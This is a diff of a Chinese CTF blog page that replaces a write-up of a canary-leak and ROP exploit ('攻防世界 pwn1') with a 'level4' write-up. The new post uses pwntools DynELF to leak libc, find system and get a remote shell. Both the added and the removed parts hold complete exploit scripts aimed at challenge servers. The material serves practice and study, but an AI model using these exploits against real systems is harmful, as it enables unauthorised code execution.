@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn,栈溢出,canary,ROP,">
+  <meta name="keywords" content="pwn,栈溢出,DynELF,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="通过print函数泄露canary，然后……">
-<meta name="keywords" content="pwn,栈溢出,canary,ROP">
+<meta name="description" content="DynELF喔~">
+<meta name="keywords" content="pwn,栈溢出,DynELF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界 pwn1">
-<meta property="og:url" content="http://suvii22.github.io/2019/10/08/攻防世界-pwn1/index.html">
+<meta property="og:title" content="level4">
+<meta property="og:url" content="http://suvii22.github.io/2019/12/01/level4/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
-<meta property="og:description" content="通过print函数泄露canary，然后……">
+<meta property="og:description" content="DynELF喔~">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-11-24T12:43:07.047Z">
+<meta property="og:updated_time" content="2019-12-01T14:38:36.229Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻防世界 pwn1">
-<meta name="twitter:description" content="通过print函数泄露canary，然后……">
+<meta name="twitter:title" content="level4">
+<meta name="twitter:description" content="DynELF喔~">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://suvii22.github.io/2019/10/08/攻防世界-pwn1/">
+  <link rel="canonical" href="http://suvii22.github.io/2019/12/01/level4/">
 
 
 
 
 
-  <title>攻防世界 pwn1 | Apr1L's blog</title>
+  <title>level4 | Apr1L's blog</title>
   
 
 
@@ -273,7 +273,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/10/08/攻防世界-pwn1/">
+    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/12/01/level4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Apr1L">
@@ -290,7 +290,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">攻防世界 pwn1</h1>
+          <h1 class="post-title" itemprop="name headline">level4</h1>
         
 
         <div class="post-meta">
@@ -302,8 +302,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-08T20:16:50+08:00">
-                2019-10-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-01T21:56:57+08:00">
+                2019-12-01
               </time>
             
 
@@ -347,8 +347,8 @@
                 
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/wp/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
+                  <a href="/categories/pwn/wp/Jarvis-OJ/" itemprop="url" rel="index">
+                    <span itemprop="name">Jarvis OJ</span>
                   </a>
                 </span>
 
@@ -384,21 +384,12 @@
       
 
       
-        <blockquote class="blockquote-center"><p>通过<code>print</code>函数泄露<code>canary</code>，然后…… </p>
+        <blockquote class="blockquote-center"><p>DynELF喔~ </p>
 </blockquote>
 <a id="more"></a>
-<h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec babystack</span><br><span class="line">CANARY    : <span class="type">ENABLED</span></span><br><span class="line">FORTIFY   : <span class="type">disabled</span></span><br><span class="line">NX        : <span class="type">ENABLED</span></span><br><span class="line">PIE       : <span class="type">disabled</span></span><br><span class="line">RELRO     : <span class="type">FULL</span></span><br></pre></td></tr></table></figure>
+<p>利用write函数泄露内存，加上pwntools中的DynELF函数遍历got表，猜解lic版本和system函数及”/bin/sh”字符串的位置，然后ROP get shell</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#p = process(<span class="string">'./level4'</span>)</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">def leak(address):</span><br><span class="line">    payload =<span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">    payload+=p32(elf.plt[<span class="string">'write'</span>])</span><br><span class="line">    payload+=p32(<span class="number">0x804844b</span>)          #vulnerable_<span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">    <span class="title">payload</span>+=<span class="title">p32</span>(<span class="params">1</span>)+<span class="title">p32</span>(<span class="params">address</span>)+<span class="title">p32</span>(<span class="params">4</span>)</span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span>(<span class="params">payload</span>)</span></span><br><span class="line"><span class="function">    <span class="title">data</span>=<span class="title">p</span>.<span class="title">recv</span>(<span class="params">4</span>)</span></span><br><span class="line"><span class="function">    <span class="title">return</span> <span class="title">data</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">d</span> = <span class="title">DynELF</span>(<span class="params">leak,elf=ELF(<span class="string">'./level4'</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="title">sys_addr</span> = <span class="title">d</span>.<span class="title">lookup</span>(<span class="params">'system','libc'</span>)</span></span><br><span class="line"><span class="function"><span class="title">bss_addr</span> = 0<span class="title">x804a024</span>                 #/<span class="title">bin</span>/<span class="title">sh</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">pop3</span> = 0<span class="title">x08048509</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">payload</span> = '<span class="title">a</span>'*(<span class="params">0x88+4</span>)+<span class="title">p32</span>(<span class="params">elf.plt['read']</span>)+<span class="title">p32</span>(<span class="params">pop3</span>)</span></span><br><span class="line"><span class="function"><span class="title">payload</span>+= <span class="title">p32</span>(<span class="params">0</span>)+<span class="title">p32</span>(<span class="params">bss_addr</span>)+<span class="title">p32</span>(<span class="params">8</span>)</span></span><br><span class="line"><span class="function"><span class="title">payload</span>+= <span class="title">p32</span>(<span class="params">sys_addr</span>)+'<span class="title">aaaa</span>'+<span class="title">p32</span>(<span class="params">bss_addr</span>)</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span>(<span class="params">payload</span>)</span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">sendline</span>(<span class="params">'/bin/sh\x00'</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">p</span>.<span class="title">interactive</span>(<span class="params"></span>)</span></span><br></pre></td></tr></table></figure>
 
-<p>我们发现程序存在<code>canary</code>，并且没有<code>system</code>和<code>/bin/sh</code>，于是我们的思路就有了：</p>
-<ul>
-<li>通过程序的<code>print</code>函数leak<code>canary</code>的值</li>
-<li>泄露<code>puts</code>真正地址，计算出<code>libcbase</code></li>
-<li>构造<code>ROP chain</code>来get shell</li>
-</ul>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#-- coding: utf:8 --</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">52594</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment">#onegadget = 0x45216</span></span><br><span class="line">poprdi = <span class="number">0x0000000000400a93</span></span><br><span class="line">putsgot = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">putsplt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">start = <span class="number">0x400720</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x88</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">"canary=&gt;"</span> +hex(canary))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">0x8</span>+p64(poprdi)+p64(putsgot)+p64(putsplt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">putsaddr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">"putsaddr=&gt;"</span> +hex(putsaddr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, putsaddr)</span><br><span class="line">libcbase = putsaddr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sysaddr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">onegadget = libcbase + onegadget</span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">0x8</span>+p64(poprdi)+p64(binsh)+p64(sysaddr)+p64(start)</span><br><span class="line"><span class="comment">#payload3 = "a"*0x88 + p64(canary) + "a"*0x8 + p64(onegadget)</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>看大佬的博客发现有一种用<code>one_gadget</code>的简单方法，但我过于菜鸡，并没有搞懂<code>one_gadget</code>……QAQ<br>文章我放在相关链接了，抽时间看看</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://xz.aliyun.com/t/2720" target="_blank" rel="noopener">glibc里的one gadget</a><br><a href="https://www.jianshu.com/p/614c97c8ca97" target="_blank" rel="noopener">exp</a></p>
 
       
     </div>
@@ -420,9 +411,7 @@
           
             <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
           
-            <a href="/tags/canary/" rel="tag"># canary</a>
-          
-            <a href="/tags/ROP/" rel="tag"># ROP</a>
+            <a href="/tags/DynELF/" rel="tag"># DynELF</a>
           
         </div>
       
@@ -435,8 +424,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/07/SUS-YoRHa-pwn2/" rel="next" title="SUS YoRHa-pwn2">
-                <i class="fa fa-chevron-left"></i> SUS YoRHa-pwn2
+              <a href="/2019/12/01/get-started-PWN5/" rel="next" title="get_started&PWN5">
+                <i class="fa fa-chevron-left"></i> get_started&PWN5
               </a>
             
           </div>
@@ -444,10 +433,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/14/Asis-CTF-2016-b00ks/" rel="prev" title="Asis CTF 2016 b00ks">
-                Asis CTF 2016 b00ks <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -499,17 +484,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -571,22 +547,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析程序"><span class="nav-number">1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">2.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关链接"><span class="nav-number">3.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
